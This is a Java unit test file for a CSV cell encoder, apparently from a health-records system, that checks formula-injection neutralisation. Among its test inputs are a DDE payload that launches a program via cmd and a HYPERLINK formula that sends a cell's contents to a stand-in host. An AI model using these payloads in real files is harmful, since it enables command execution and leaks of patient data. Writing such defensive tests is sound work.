package com.medchart.ehr.legacy;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;

class CsvEncoderTest {

    @Test
    void neutralisesFormulaTriggers() {
        assertEquals("\"'=1+1\"", CsvEncoder.cell("=1+1"));
        assertEquals("\"'+1\"", CsvEncoder.cell("+1"));
        assertEquals("\"'-2+3\"", CsvEncoder.cell("-2+3"));
        assertEquals("\"'@SUM(A1:A2)\"", CsvEncoder.cell("@SUM(A1:A2)"));
        assertEquals("\"'\tcmd\"", CsvEncoder.cell("\tcmd"));
        assertEquals("\"'\r=1\"", CsvEncoder.cell("\r=1"));
        assertEquals("\"'\n=HYPERLINK(1)\"", CsvEncoder.cell("\n=HYPERLINK(1)"));
    }

    @Test
    void neutralisesFormulasHiddenBehindLeadingWhitespaceOrControlChars() {
        assertEquals("\"' =1+1\"", CsvEncoder.cell(" =1+1"));
        assertEquals("\"'\u00a0@SUM(A1)\"", CsvEncoder.cell("\u00a0@SUM(A1)"));
        assertEquals("\"'\u0000=cmd|' /C calc'!A0\"", CsvEncoder.cell("\u0000=cmd|' /C calc'!A0"));
        assertEquals("\"  Jane\"", CsvEncoder.cell("  Jane"));
        assertEquals("\"   \"", CsvEncoder.cell("   "));
    }

    @Test
    void quotesAndDoublesEmbeddedQuotes() {
        assertEquals("\"'=HYPERLINK(\"\"https://x.example/?d=\"\"&B2,\"\"open\"\")\"",
                CsvEncoder.cell("=HYPERLINK(\"https://x.example/?d=\"&B2,\"open\")"));
        assertEquals("\"Smith, Jr\"", CsvEncoder.cell("Smith, Jr"));
        assertEquals("\"O'Brien\"", CsvEncoder.cell("O'Brien"));
    }

    @Test
    void leavesPlainValuesUnchangedAndNullsEmpty() {
        assertEquals("\"Jane Doe\"", CsvEncoder.cell("Jane Doe"));
        assertEquals("\"42\"", CsvEncoder.cell(42L));
        assertEquals("\"\"", CsvEncoder.cell(null));
        assertEquals("\"\"", CsvEncoder.cell(""));
    }

    @Test
    void rowJoinsEncodedCells() {
        assertEquals("\"1\",\"'=1+1\",\"Doe, Jane\",\"\"", CsvEncoder.row(1, "=1+1", "Doe, Jane", null));
    }
}
